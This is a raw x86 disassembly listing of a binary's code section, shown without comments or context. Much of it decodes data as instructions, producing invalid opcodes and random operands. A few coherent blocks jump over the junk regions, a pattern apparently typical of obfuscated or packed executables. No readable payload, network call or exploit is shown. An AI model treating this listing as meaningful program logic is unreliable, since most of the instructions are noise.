  428df3:	add    bl,al
  428df5:	add    BYTE PTR [eax],al
  428df7:	add    ch,ch
  428df9:	add    al,0x90
  428dfb:	add    ecx,DWORD PTR [edx]
  428dfd:	cdq    
  428dfe:	cld    
  428dff:	shl    ah,0x2
  428e02:	pusha  
  428e03:	neg    BYTE PTR [edx+0x64]
  428e06:	push   esi
  428e07:	dec    esi
  428e08:	sub    DWORD PTR [edx-0x2e],ecx
  428e0b:	pop    ss
  428e0c:	pop    es
  428e0d:	sub    edi,esp
  428e0f:	xchg   esi,eax
  428e10:	cmp    al,0xfb
  428e12:	pop    edx
  428e13:	stos   DWORD PTR es:[edi],eax
  428e14:	or     ebx,DWORD PTR [ebp-0x37]
  428e17:	dec    ebp
  428e18:	iret   
  428e19:	jae    0x428e77
  428e1b:	stos   DWORD PTR es:[edi],eax
  428e1c:	inc    ebp
  428e1d:	inc    ebx
  428e1e:	inc    edx
  428e1f:	cmp    DWORD PTR [esi+ebp*8+0x25],0x13
  428e24:	push   eax
  428e25:	cmp    al,0x55
  428e27:	inc    ebp
  428e28:	sub    ecx,ecx
  428e2a:	inc    ebp
  428e2b:	sbb    BYTE PTR fs:[esi],al
  428e2e:	clc    
  428e2f:	int    0xc0
  428e31:	sbb    al,0xa7
  428e33:	or     al,0xb8
  428e35:	xor    BYTE PTR ds:0xcdbb7c3b,bh
  428e3b:	outs   dx,DWORD PTR ds:[esi]
  428e3c:	js     0x428e87
  428e3e:	sub    DWORD PTR [eax+ebp*1+0x59],0xd799d10a
  428e46:	push   ebx
  428e47:	adc    edx,esp
  428e49:	inc    BYTE PTR [ecx-0x27]
  428e4c:	addr16 (bad) 
  428e4e:	sti    
  428e4f:	add    eax,edx
  428e51:	dec    ebx
  428e52:	lea    edi,[ecx+0x13]
  428e55:	out    0xdb,al
  428e57:	sbb    dh,0xd8
  428e5a:	sar    al,0xb7
  428e5d:	push   ss
  428e5e:	sbb    al,0xc8
  428e60:	in     al,0x53
  428e62:	cmp    DWORD PTR [edi],edi
  428e64:	ret    
  428e65:	stos   DWORD PTR es:[edi],eax
  428e66:	push   ebp
  428e67:	sub    eax,0xa401265e
  428e6c:	push   edx
  428e6d:	xchg   ebx,eax
  428e6e:	pop    ebp
  428e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e70:	pop    eax
  428e71:	add    eax,esp
  428e73:	dec    edi
  428e74:	mov    al,0x1f
  428e76:	cs xchg ebx,eax
  428e78:	fiadd  WORD PTR [ecx+0x3a]
  428e7b:	push   ebp
  428e7c:	addr16 (bad) 
  428e7e:	cmp    al,0xd6
  428e80:	or     DWORD PTR [eax-0x21],ecx
  428e83:	push   esp
  428e84:	into   
  428e85:	loope  0x428ed1
  428e87:	adc    eax,0xe1482e4f
  428e8c:	jnp    0x428ea9
  428e8e:	cmp    esi,DWORD PTR [ebx]
  428e90:	cmp    DWORD PTR [ebp-0x5f8e3e9a],0xffffff83
  428e97:	mov    eax,0x83cc5c7a
  428e9c:	fisub  WORD PTR [esi+ebp*4+0x44]
  428ea0:	lahf   
  428ea1:	jns    0x428f21
  428ea3:	adc    eax,0x9bd808fa
  428ea8:	mov    ebp,0xca0a9080
  428ead:	cmp    BYTE PTR [ebx],ch
  428eaf:	xor    BYTE PTR [ebp+esi*4-0x3de2cea],ah
  428eb6:	xchg   esi,eax
  428eb7:	mov    esp,0x2351d901
  428ebc:	rol    edi,0x5
  428ebf:	je     0x428eb6
  428ec1:	inc    edx
  428ec2:	add    dh,dl
  428ec4:	cmp    al,BYTE PTR [eax]
  428ec6:	add    BYTE PTR [esi-0x75],ah
  428ec9:	dec    esp
  428eca:	and    al,0x20
  428ecc:	jmp    0x428fac
  428ed1:	sbb    eax,0x7c655c6d
  428ed6:	jne    0x428f15
  428ed8:	jge    0x428ef4
  428eda:	cdq    
  428edb:	jae    0x428e72
  428edd:	adc    edi,DWORD PTR [ebp-0x1bf8ccec]
  428ee3:	add    DWORD PTR [eax],eax
  428ee5:	ret    
  428ee6:	add    BYTE PTR [eax],al
  428ee8:	add    BYTE PTR [edx+0x799f1f00],dl
  428eee:	or     edx,DWORD PTR [edx]
  428ef0:	fisttp WORD PTR [eax+0x70]
  428ef3:	adc    al,0x0
  428ef5:	pop    es
  428ef6:	push   ecx
  428ef7:	dec    eax
  428ef8:	mov    esp,0xfc40f8fe
  428efd:	aaa    
  428efe:	or     eax,0xa75af5f4
  428f03:	and    bl,ah
  428f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f06:	lods   eax,DWORD PTR ds:[esi]
  428f07:	div    BYTE PTR [ecx+0x3b]
  428f0a:	retf   0x65b8
  428f0d:	shl    BYTE PTR [ebx+0x66d4a68f],cl
  428f13:	jb     0x428ee9
  428f15:	out    0xb2,al
  428f17:	mov    ebx,0xcc11595e
  428f1c:	retf   
  428f1d:	repnz xchg ebp,eax
  428f1f:	inc    esi
  428f20:	xor    BYTE PTR [esp+ecx*8+0x6f4bd37f],ah
  428f27:	jno    0x428ede
  428f29:	push   ecx
  428f2a:	ins    DWORD PTR es:[edi],dx
  428f2b:	or     DWORD PTR [eax+0x20bb87c7],esi
  428f31:	fadd   QWORD PTR [edi+ebp*8+0x40]
  428f35:	xor    eax,0x10b86565
  428f3a:	mov    ecx,esi
  428f3c:	gs jo  0x428ed5
  428f3f:	ss cld 
  428f41:	cmp    esi,DWORD PTR [edx]
  428f43:	xchg   esp,eax
  428f44:	mov    al,ah
  428f46:	sbb    esp,DWORD PTR [edx+0x7b]
  428f49:	ret    0xf5ea
  428f4c:	call   0xb5eaf38e
  428f51:	and    eax,0xe765d824
  428f56:	cmp    BYTE PTR [ebx+0x5c],al
  428f59:	imul   ebx,DWORD PTR [edi+eiz*8],0x5ba91873
  428f60:	sub    eax,0xc61318a3
  428f65:	shl    BYTE PTR [edx-0x67af7325],0xa2
  428f6c:	xchg   edi,eax
  428f6d:	rcl    BYTE PTR [edi+0x3a2a38b4],0x79
  428f74:	cwde   
  428f75:	adc    esi,DWORD PTR [ecx-0x5ef57e3a]
  428f7b:	push   edi
  428f7c:	lock clc 
  428f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f7f:	sbb    ecx,esi
  428f81:	rcl    ch,cl
  428f83:	lods   eax,DWORD PTR ds:[esi]
  428f84:	lahf   
  428f85:	adc    DWORD PTR [ecx+0x5d],edx
  428f88:	imul   BYTE PTR [edx+0x6f2affa0]
  428f8e:	xor    DWORD PTR [ebx],edx
  428f90:	or     cl,BYTE PTR [ecx+0x47f05367]
  428f96:	adc    DWORD PTR [edi+0xab10919],edi
  428f9c:	fdivp  st(0),st
  428f9e:	aaa    
  428f9f:	inc    eax
  428fa0:	adc    eax,DWORD PTR [eax-0x6c]
  428fa3:	test   eax,0x8eeeb2dd
  428fa8:	push   cs
  428fa9:	sbb    DWORD PTR [edi-0x3648f03e],0xf5bc05c7
  428fb3:	inc    edx
  428fb4:	add    BYTE PTR [edi+0x24],dl
  428fb7:	add    BYTE PTR [eax],al
  428fb9:	cmp    eax,ecx
  428fbb:	jg     0x42a013
  428fc1:	mov    DWORD PTR [esp+0x30],0x6ae6
  428fc9:	jmp    0x4290a9
  428fce:	push   esp
  428fcf:	int    0xe1
  428fd1:	dec    edi
  428fd2:	stc    
  428fd3:	outs   dx,DWORD PTR ds:[esi]
  428fd4:	(bad)  
  428fd5:	fild   QWORD PTR [esi+0x8]
  428fd8:	mov    ds:0x28bd3e3f,al
  428fdd:	ret    
  428fde:	retf   0x1e4
  428fe1:	add    bl,al
  428fe3:	add    BYTE PTR [eax],al
  428fe5:	add    BYTE PTR [edi+0x23],ch
  428fe8:	mov    bh,0x22
  428fea:	mov    BYTE PTR [ecx+0x5127ef0d],dh
  428ff0:	sub    BYTE PTR [ecx+edi*1+0x6ed7c94],dh
  428ff7:	sub    ah,0x32
  428ffa:	xor    edx,eax
  428ffc:	mov    eax,0xdacbbbde
  429001:	out    0xf9,al
  429003:	ds repnz leave 
  429006:	sub    cl,BYTE PTR [edi+0x40]
  429009:	inc    ebp
  42900a:	sbb    DWORD PTR [ecx+ebx*4+0x40b67860],ebp
  429011:	inc    esp
  429012:	sub    esp,ebp
  429014:	loope  0x429023
  429016:	mov    edx,0xb9327601
  42901b:	int    0x2c
  42901d:	jge    0x428fe3
  42901f:	or     DWORD PTR [esi+0x5],edi
  429022:	cli    
  429023:	(bad)  
  429024:	push   ebp
  429025:	sub    BYTE PTR [ebx-0x65cf2a87],cl
  42902b:	scas   al,BYTE PTR es:[edi]
  42902c:	inc    edi
  42902d:	fiadd  DWORD PTR [ebx+0x3a]
  429030:	stos   BYTE PTR es:[edi],al
  429031:	dec    ebx
  429032:	adc    BYTE PTR [edx],ch
  429034:	sub    DWORD PTR [esi],ebx
  429036:	cdq    
  429037:	ins    BYTE PTR es:[edi],dx
  429038:	in     al,dx
  429039:	in     eax,0x58
  42903b:	jne    0x429027
  42903d:	jb     0x429045
  42903f:	lock xor eax,0x8f5c14c1
  429045:	mov    eax,0x2c1ef7e0
  42904a:	int3   
  42904b:	jns    0x429096
  42904d:	inc    ebp
  42904e:	sub    ebp,edx
  429050:	out    dx,al
  429051:	mul    DWORD PTR [esi-0x11]
  429054:	cld    
  429055:	sub    eax,0x3a99cbeb
  42905a:	arpl   WORD PTR [ecx-0x5e],bp
  42905d:	test   ah,bh
  42905f:	les    ecx,FWORD PTR [ebp-0x9ac754d]
  429065:	xchg   ebx,eax
  429066:	outs   dx,BYTE PTR ds:[esi]
  429068:	out    0xca,al
  42906a:	adc    DWORD PTR [eax],esi
  42906c:	sub    al,0xa2
  42906e:	pop    ebp
  42906f:	ja     0x4290b8
  429071:	cli    
  429072:	stc    
  429073:	outs   dx,DWORD PTR ds:[esi]
  429074:	jg     0x429030
  429076:	sbb    eax,0xccac169a
  42907b:	call   0xbf16e68d
  429080:	jmp    DWORD PTR ds:0x91cea3d2
  429086:	cmp    eax,0xca2528ff
  42908b:	xlat   BYTE PTR ds:[ebx]
  42908c:	xor    ebx,DWORD PTR [eax+eax*4]
  42908f:	xor    bh,dh
  429091:	adc    ebp,edi
  429093:	push   ds
  429094:	(bad)  
  429095:	cmp    edi,DWORD PTR [edi-0x40]
  429098:	dec    esi
  429099:	loopne 0x429026
  42909b:	sbb    al,0x6a
  42909d:	fwait
  42909e:	xor    edx,esp
  4290a0:	xchg   edx,eax
  4290a1:	jecxz  0x429025
  4290a3:	inc    esi
  4290a4:	stos   BYTE PTR es:[edi],al
  4290a5:	addr16 shl edx,cl
  4290a8:	in     al,0xc7
  4290aa:	inc    esp
  4290ab:	and    al,0x34
  4290ad:	or     edx,DWORD PTR ds:0xdbe90000
  4290b3:	add    BYTE PTR [eax],al
  4290b5:	add    BYTE PTR [eax],bl
  4290b7:	mov    ah,0xe4
  4290b9:	imul   ebp,esp,0x73f59d79
  4290bf:	and    ah,BYTE PTR [ebp-0x41d8a83c]
  4290c5:	ins    DWORD PTR es:[edi],dx
  4290c6:	(bad)  
  4290c7:	in     eax,0x1
  4290c9:	add    bl,al
  4290cb:	add    BYTE PTR [eax],al
  4290cd:	add    BYTE PTR [eax+0x2b7ea180],cl
  4290d3:	gs pushf 
  4290d5:	xor    eax,0x873b0c68
  4290da:	add    al,0xd2
  4290dc:	add    esi,esp
  4290de:	out    0xff,eax
  4290e0:	jo     0x4290fc
  4290e2:	or     BYTE PTR [ecx],ch
  4290e4:	cmp    eax,0x3f5888e7
  4290e9:	mov    ss,WORD PTR [esp+ebp*2]
  4290ec:	lods   eax,DWORD PTR ds:[esi]
  4290ed:	push   cs
  4290ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290ef:	sub    DWORD PTR [ecx-0x6f22c355],esp
  4290f5:	mov    eax,ds:0xe4301821
  4290fa:	mov    dh,0x9
  4290fc:	cdq    
  4290fd:	add    al,0xb0
  4290ff:	sub    eax,0x225e1aaf
  429104:	mov    bh,0xb7
  429106:	cwde   
  429107:	and    ebp,edi
  429109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42910a:	(bad)  
  42910b:	retf   
  42910c:	or     eax,0x61b44442
  429111:	mov    al,ds:0x37abd73b
  429116:	daa    
  429117:	pop    esp
  429118:	adc    al,0x17
  42911a:	add    al,0xc9
  42911c:	sub    ebp,eax
  42911e:	jmp    0x63899429
  429123:	push   0xd8c690f1
  429128:	pop    ebp
  429129:	jae    0x42918f
  42912b:	shl    esp,0x4f
  42912e:	mov    ds,WORD PTR [ebp-0x5bd6b40e]
  429134:	jp     0x4290f1
  429136:	(bad)  
  429137:	fld    DWORD PTR [ecx+0x47]
  42913a:	rol    DWORD PTR [edi-0x181d172a],1
  429140:	sub    cl,BYTE PTR [eax+0x109e1f5a]
  429146:	mov    dl,0xcd
  429148:	out    0x1c,eax
  42914a:	outs   dx,BYTE PTR ds:[esi]
  42914b:	scas   al,BYTE PTR es:[edi]
  42914c:	fcom   QWORD PTR [eax-0xf]
  42914f:	jne    0x429124
  429151:	lods   eax,DWORD PTR ds:[esi]
  429152:	ror    DWORD PTR [edx+0x29307e7c],0xb7
  429159:	sub    al,0xf5
  42915b:	jecxz  0x4291cb
  42915d:	sbb    BYTE PTR [edi],dh
  42915f:	fidivr DWORD PTR [eax-0x51]
  429162:	push   ebx
  429163:	or     BYTE PTR [ebx],bh
  429165:	syscall 
  429167:	and    DWORD PTR ds:0xf1ce0a7c,ebp
  42916d:	shr    BYTE PTR [ecx+0x1b],1
  429170:	push   esi
  429171:	adc    eax,0x26937de8
  429176:	push   esp
  429177:	pop    edx
  429178:	aam    0x8a
  42917a:	and    BYTE PTR [ebx-0x66],dh
  42917d:	enter  0x5d74,0xbd
  429181:	stc    
  429182:	xchg   edx,eax
  429183:	adc    al,0x42
  429185:	es mov ah,0xbc
  429188:	mov    gs,WORD PTR [esi+edi*2-0x49]
  42918c:	mov    edx,0x5ad81640
  429191:	mov    DWORD PTR [esp+0x28],0x14011c5e
  429199:	add    eax,ecx
  42919b:	mov    DWORD PTR [esp+0x2c],0x0
  4291a3:	adc    DWORD PTR ds:0x42f590,0x42f670
  4291ad:	mov    DWORD PTR [esp+0x20],0x9a5
  4291b5:	jmp    0x429295
  4291ba:	imul   esp,DWORD PTR [esi-0x13001fe],0x654ab7fd
  4291c4:	retf   0x848f
  4291c7:	stc    
  4291c8:	pop    ss
  4291c9:	ins    DWORD PTR es:[edi],dx
  4291ca:	push   eax
  4291cb:	out    0x1,al
  4291cd:	add    bl,al
  4291cf:	add    BYTE PTR [eax],al
  4291d1:	add    dh,ch
  4291d3:	pop    ebp
  4291d4:	jge    0x429251
  4291d6:	mov    edx,0xe6fd718a
  4291db:	pop    esp
  4291dc:	gs xor eax,0x6f136681
  4291e2:	in     eax,0x81
  4291e4:	in     eax,dx
  4291e5:	inc    ecx
  4291e6:	push   edi
  4291e7:	jae    0x42923c
  4291e9:	sub    BYTE PTR [esi],ah
  4291eb:	mov    BYTE PTR [edi],dh
  4291ed:	repnz cmp BYTE PTR [eax-0x25],0x7d
  4291f2:	inc    eax
  4291f3:	jle    0x429198
  4291f5:	scas   al,BYTE PTR es:[edi]
  4291f6:	dec    ebp
  4291f7:	cld    
  4291f8:	pop    esp
  4291f9:	adc    ecx,0xed7d3ef9
  4291ff:	adc    eax,0xa9ee0c7e
  429204:	cmp    ebx,DWORD PTR [eax-0x4d]
  429207:	xor    BYTE PTR [edi],ah
  429209:	(bad)  [esp+edi*8]
  42920c:	in     al,dx
  42920d:	adc    DWORD PTR [esi-0x74],edi
  429210:	cmp    eax,0xc339a2d0
  429215:	out    0xf6,al
  429217:	and    eax,0xc1cc61a
  42921c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42921d:	fnstcw WORD PTR [ebx+0x3]
  429220:	ret    0x7709
  429223:	arpl   WORD PTR cs:[ebx],dx
  429226:	ret    0x3012
  429229:	add    al,0xc9
  42922b:	out    dx,eax
  42922c:	arpl   WORD PTR [edi-0x50ac0d32],bp
  429232:	mov    ds:0xc45fcc41,al
  429237:	xchg   esp,eax
  429238:	repz (bad) 
  42923a:	jns    0x429223
  42923c:	daa    
  42923d:	adc    BYTE PTR [ebx+0xc0b5667],cl
  429243:	aam    0x7e
  429245:	sub    edx,DWORD PTR [edi-0x4d]
  429248:	sbb    BYTE PTR [esi],al
  42924a:	int3   
  42924b:	mov    ebx,0x8e32e3d
  429250:	xor    dh,BYTE PTR ds:0xa6440d75
  429256:	ds repz dec ecx
  429259:	dec    edx
  42925a:	inc    ebx
  42925b:	test   eax,0x4bb45659
  429260:	out    dx,eax
  429261:	int3   
  429262:	in     al,0x12
  429264:	and    eax,0xe1a4b547
  429269:	cmp    DWORD PTR [esi-0x3a],ebx
  42926c:	add    esi,DWORD PTR [ecx]
  42926e:	or     cl,BYTE PTR [esi-0x416113d5]
  429274:	ss dec ebx
  429276:	adc    ecx,DWORD PTR ds:0xac463829
  42927c:	xchg   BYTE PTR [edx],bh
  42927e:	sti    
  42927f:	mov    dh,BYTE PTR [eax]
  429281:	inc    ebp
  429282:	stos   DWORD PTR es:[edi],eax
  429283:	jno    0x42923a
  429285:	cmp    esp,DWORD PTR [ebx-0x49e9c7b4]
  42928b:	jecxz  0x42928c
  42928d:	cmp    eax,0x6ef46083
  429292:	mov    bh,0x69
  429294:	jecxz  0x42925d
  429296:	inc    esp
  429297:	and    al,0x24
  429299:	or     al,0x2f
  42929b:	add    BYTE PTR [eax],al
  42929d:	mov    DWORD PTR [esp+0x18],0x7b8c
  4292a5:	cmp    DWORD PTR ds:0x42f63c,0x0
  4292ac:	jg     0x4292c7
  4292b2:	jmp    0x4292c7
  4292b7:	push   0x7ec1
  4292bc:	push   0x16a7
  4292c1:	call   DWORD PTR ds:0x4387a4
  4292c7:	mov    DWORD PTR [esp+0x1c],0x28ed
  4292cf:	mov    eax,DWORD PTR [esp+0x18]
  4292d3:	mov    ecx,DWORD PTR [esp+0x1c]
  4292d7:	mov    edx,DWORD PTR [esp+0x20]
  4292db:	jmp    0x4293bb
  4292e0:	and    BYTE PTR [ebx-0x8],bh
  4292e3:	lahf   
  4292e4:	sti    
  4292e5:	lahf   
  4292e6:	call   FWORD PTR [si-0x4d]
  4292ea:	stos   BYTE PTR es:[edi],al
  4292eb:	in     al,0xcc
  4292ed:	cmc    
  4292ee:	shl    DWORD PTR [ecx+0x1e713],1
  4292f4:	ret    
  4292f5:	add    BYTE PTR [eax],al
  4292f7:	add    BYTE PTR ds:0xcd4a18a6,dh
  4292fd:	and    eax,DWORD PTR [ebx-0x6a45b7d]
  429303:	push   edx
  429304:	hlt    
  429305:	(bad)  
  429306:	lahf   
  429307:	lods   eax,DWORD PTR ds:[esi]
  429308:	bound  edi,QWORD PTR [ebp+0x3b416c60]
  42930e:	jl     0x42929f
  429310:	xchg   DWORD PTR [ebp-0x3e],ebx
  429313:	inc    eax
  429314:	ret    
  429315:	int    0x66
  429317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429318:	push   esi
  429319:	jbe    0x42935d
  42931b:	push   0xdc574704
  429320:	xor    eax,0x356345d1
  429325:	fimul  WORD PTR [ecx]
  429327:	(bad)  
  429328:	idiv   BYTE PTR [edx]
  42932a:	gs test al,0x27
  42932d:	cwde   
  42932e:	jo     0x429328
  429330:	loop   0x4292c5
  429332:	aad    0xd5
  429334:	pop    edi
  429335:	add    esp,DWORD PTR [ecx]
  429337:	jp     0x42934e
  429339:	mov    ds:0xe94a99ee,eax
  42933e:	pop    ebp
  42933f:	add    dh,ah
  429341:	in     eax,dx
  429342:	out    0x5b,al
  429344:	mov    cs,WORD PTR [ebx+0x6440655]
  42934a:	dec    eax
  42934b:	ins    BYTE PTR es:[edi],dx
  42934c:	ss into 
  42934e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42934f:	jl     0x429338
  429351:	pop    esi
  429352:	add    eax,0x7b056813
  429357:	push   ecx
  429358:	(bad)  
  429359:	stc    
  42935a:	(bad)  
  42935b:	jb     0x42938a
  42935d:	call   0xf2d600f2
  429362:	push   ss
  429363:	pop    ebp
  429364:	pop    ebp
  429365:	fsubr  st(6),st
  429367:	les    ebx,FWORD PTR [edx+0x3]
  42936a:	cmc    
  42936b:	mov    dl,0x50
  42936d:	arpl   WORD PTR [ecx-0x661bed67],dx
  429373:	in     eax,dx
  429374:	and    BYTE PTR [ebp+0x59],0x5f
  429378:	push   edi
  429379:	outs   dx,BYTE PTR ds:[esi]
  42937a:	ins    BYTE PTR es:[edi],dx
  42937b:	mov    edx,0xb4636b46
  429380:	push   es
  429381:	mov    bl,ah
  429383:	push   esi
  429384:	mov    dh,0x11
  429386:	cmc    
  429387:	ins    BYTE PTR es:[edi],dx
  429388:	sub    BYTE PTR [eax+0x65],cl
  42938b:	ins    BYTE PTR es:[edi],dx
  42938c:	in     eax,dx
  42938d:	sar    DWORD PTR [ecx],1
  42938f:	push   0xc962b6c5
  429394:	add    DWORD PTR [edx+0x66e95dd5],ebp
  42939a:	loope  0x4293a7
  42939c:	ror    BYTE PTR [edx+0x3519b208],1
  4293a2:	mov    edx,ebp
  4293a4:	faddp  st(1),st
  4293a6:	jg     0x4293d5
  4293a8:	ds or  eax,0xb93c3cf9
  4293ae:	test   DWORD PTR [edi+eax*8],edx
  4293b1:	pop    ss
  4293b2:	mov    ds:0x60ef599b,eax
  4293b7:	out    dx,al
  4293b8:	pop    edi
  4293b9:	dec    esi
  4293ba:	fmul   DWORD PTR [ebx+0x3324245c]
  4293c0:	ret    0x548b
  4293c3:	and    al,0x28
  4293c5:	adc    DWORD PTR ds:0x42f5d0,0x7b97
  4293cf:	xor    ecx,ebx
  4293d1:	or     DWORD PTR ds:0x42f608,ebx
  4293d7:	mov    ebx,DWORD PTR [esp+0x2c]
  4293db:	or     DWORD PTR ds:0x42f5ac,0x42f608
  4293e5:	push   ebx
  4293e6:	push   edx
  4293e7:	dec    DWORD PTR ds:0x42f624
  4293ed:	push   ecx
  4293ee:	push   eax
  4293ef:	adc    DWORD PTR ds:0x42f560,0x42f548
  4293f9:	call   0x423dad
  4293fe:	add    DWORD PTR ds:0x42f63c,0x32db
  429408:	mov    ecx,DWORD PTR [esp+0x30]
  42940c:	sub    DWORD PTR ds:0x42f638,0x2b17
  429416:	mov    ebx,DWORD PTR [esp+0x34]
  42941a:	xor    eax,ecx
  42941c:	cmp    DWORD PTR ds:0x42f5e4,0x0
  429423:	jge    0x429526
  429429:	mov    DWORD PTR ds:0x42f650,0x7bb8
  429433:	jmp    0x429526
  429438:	push   0x42f5c8
  42943d:	push   DWORD PTR [ebp-0x20]
  429440:	call   DWORD PTR ds:0x4387e4
  429446:	jmp    0x429526
  42944b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42944c:	js     0x42944b
  42944e:	inc    ebx
  42944f:	inc    edi
  429451:	mov    edi,0xa77a83fc
  429456:	or     eax,0xc3fb7ad0
  42945b:	(bad)  
  42945c:	out    0x1,eax
  42945e:	add    bl,al
  429460:	add    BYTE PTR [eax],al
  429462:	add    bh,al
  429464:	ja     0x42943f
  429466:	inc    edi
  429467:	jnp    0x4294e6
  429469:	dec    ebx
  42946a:	mov    esi,0x538d1691
  42946f:	or     eax,0x40fc1d2d
  429474:	repz xchg esi,eax
  429476:	mov    esi,0xab1ed262
  42947b:	test   ch,cl
  42947d:	call   0xbd8:0x84bcbc62
  429484:	sub    ebx,DWORD PTR [esi+0x4c608260]
  42948a:	pop    edx
  42948b:	sbb    BYTE PTR [edx+0x64],dh
  42948e:	mov    dh,0x1
  429490:	lahf   
  429491:	add    BYTE PTR [ebp+0x28],al
  429494:	int    0x9f
  429496:	bound  ebp,QWORD PTR [edi+0x1498cedf]
  42949c:	pop    ebx
  42949d:	or     eax,0xb0753279
  4294a2:	adc    al,0x69
  4294a4:	out    dx,eax
  4294a5:	sti    
  4294a6:	mov    dl,0x5b
  4294a8:	leave  
  4294a9:	outs   dx,DWORD PTR ds:[esi]
  4294aa:	adc    al,0x19
  4294ac:	sbb    esi,edx
  4294ae:	sbb    ch,BYTE PTR [ecx]
  4294b0:	mov    eax,0xdbc88650
  4294b5:	inc    edx
  4294b6:	push   edx
  4294b7:	inc    eax
  4294b8:	jo     0x42952e
  4294ba:	adc    DWORD PTR [edx+0x50103a27],edi
  4294c0:	out    0xd6,eax
  4294c2:	xchg   ebx,eax
  4294c3:	fwait
  4294c4:	inc    esp
  4294c5:	cmp    BYTE PTR cs:[edx],dl
  4294c8:	or     ch,ch
  4294ca:	push   ds
  4294cb:	aam    0xb
  4294cd:	and    al,0x7c
  4294cf:	neg    ebx
  4294d1:	mov    dh,0x69
  4294d3:	mov    cl,0xe9
  4294d5:	in     al,dx
  4294d6:	fwait
  4294d7:	push   esp
  4294d8:	test   DWORD PTR [esi-0x1b],edi
  4294db:	xor    DWORD PTR [edx+0x6e],ebp
  4294de:	sbb    DWORD PTR [ecx+ebp*2],0x2b
  4294e2:	fabs   
  4294e4:	jle    0x4294db
  4294e6:	cdq    
  4294e7:	push   es
  4294e8:	pop    edi
  4294e9:	(bad)  
  4294ea:	sbb    DWORD PTR [ebx],edx
  4294ec:	lods   al,BYTE PTR ds:[esi]
  4294ed:	lods   eax,DWORD PTR ds:[esi]
  4294ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294ef:	mov    esi,0xb791f25e
  4294f4:	fistp  QWORD PTR [edi+0x32]
  4294f7:	ret    0xa8b3
  4294fa:	test   al,0xc4
  4294fc:	xchg   esi,eax
  4294fd:	xor    DWORD PTR [ebp+0x2c],edi
  429500:	lock call 0x69008ee
  429506:	fs mov esp,0xf95da895
  42950c:	push   ebx
  42950d:	pop    esi
  42950e:	test   eax,0x857b4c2f
  429513:	jge    0x4294b3
  429515:	pop    ds
  429516:	sub    eax,0x8a2c19d4
  42951b:	cmp    edx,DWORD PTR [ebp-0x382dc448]
  429521:	test   eax,0xc74ab91a
  429526:	xor    edx,ebx
  429528:	and    eax,0x691c
  42952d:	mov    DWORD PTR [esp+0x30],eax
  429531:	and    edx,0x3f03
  429537:	jmp    0x429617
  42953c:	pop    eax
  42953d:	mov    gs,esp
  42953f:	sar    dh,1
  429541:	bnd jl 0x4294d2
  429544:	rcr    BYTE PTR [eax-0x1e8cce9],cl
  42954a:	repz addr16 cdq 
  42954d:	call   0x1059553
  429552:	add    BYTE PTR [eax],al
  429554:	out    dx,eax
  429555:	jge    0x429539
  429557:	pop    esp
  429558:	ds icebp 
  42955a:	xor    BYTE PTR [edi+0x45],dl
  42955d:	dec    ecx
  42955e:	(bad)  
  42955f:	cli    
  429560:	sub    ebp,DWORD PTR [edi+0x60653548]
  429566:	cmp    DWORD PTR ds:0x2e5a1d77,eax
  42956c:	cmp    esp,DWORD PTR [ecx-0x33]
  42956f:	xchg   ebx,eax
  429570:	adc    DWORD PTR [ebp-0x3cc943d2],esi
  429576:	xor    DWORD PTR [ebp+0x30],0x10551775
  42957d:	sar    edx,1
  42957f:	es psubw mm6,mm3
  429583:	or     BYTE PTR [eax-0x3f],al
  429586:	lods   eax,DWORD PTR ds:[esi]
  429587:	stc    
  429588:	push   0xffffffb4
  42958a:	push   edx
  42958b:	(bad)  
  42958c:	mov    ds:0x1665923a,eax
  429591:	inc    edx
  429592:	jo     0x4295a4
  429594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429595:	add    al,0x4e
  429597:	mov    DWORD PTR [ebx-0x6ae7cd1],edi
  42959d:	jae    0x429597
  42959f:	push   0xffffffea
  4295a1:	lods   al,BYTE PTR ds:[esi]
  4295a2:	repz or BYTE PTR [edi+0x1c],dh
  4295a6:	jmp    0x1eb7:0x3f78c08c
  4295ad:	mov    bl,0xb0
  4295af:	ds cdq 
  4295b1:	sub    DWORD PTR [ebx],eax
  4295b3:	pop    ds
  4295b4:	mov    ds:0xa1565aa5,al
  4295b9:	in     eax,dx
  4295ba:	jne    0x42958e
  4295bc:	and    eax,esp
  4295be:	inc    ebx
  4295bf:	sbb    DWORD PTR [ecx],eax
  4295c1:	pop    ebx
  4295c2:	sbb    ebx,esi
  4295c4:	xchg   esi,eax
  4295c5:	mul    BYTE PTR [ecx+edx*4-0x69]
  4295c9:	scas   eax,DWORD PTR es:[edi]
  4295ca:	fsubr  DWORD PTR [esi-0x5993166b]
  4295d0:	sub    eax,0x27fbc5
  4295d5:	icebp  
  4295d6:	aad    0xc1
  4295d8:	xchg   esp,eax
  4295d9:	ret    
  4295da:	mov    ebp,0xeeb1c7ca
  4295df:	repz inc ecx
  4295e1:	mov    WORD PTR [eax-0x538d8ba7],ss
  4295e7:	xor    al,0x82
  4295e9:	jnp    0x4295c6
  4295eb:	ret    
  4295ec:	inc    ebp
  4295ed:	or     BYTE PTR [edx+0x66192c23],al
  4295f3:	push   esp
  4295f4:	xchg   edx,eax
  4295f5:	mov    bh,0x7a
  4295f7:	dec    eax
  4295f8:	inc    esp
  4295f9:	sbb    al,bh
  4295fb:	and    BYTE PTR [edi],0xcc
  4295fe:	test   al,0xf4
  429601:	scas   al,BYTE PTR es:[edi]
  429602:	cld    
  429603:	iret   
  429604:	sub    eax,0x269b694f
  429609:	pop    esi
  42960a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42960b:	and    eax,0xbf75d862
  429610:	and    ch,BYTE PTR [edi-0x779016be]
  429616:	dec    ebp
  429617:	mov    DWORD PTR [esp+0x34],edx
  42961b:	mov    DWORD PTR [esp+0x28],0x811
  429623:	mov    eax,ds:0x42f69c
  429628:	mov    ecx,DWORD PTR ds:0x42f6dc
  42962e:	sub    eax,ecx
  429630:	and    eax,DWORD PTR [eax+ecx*1]
  429633:	jmp    0x429713
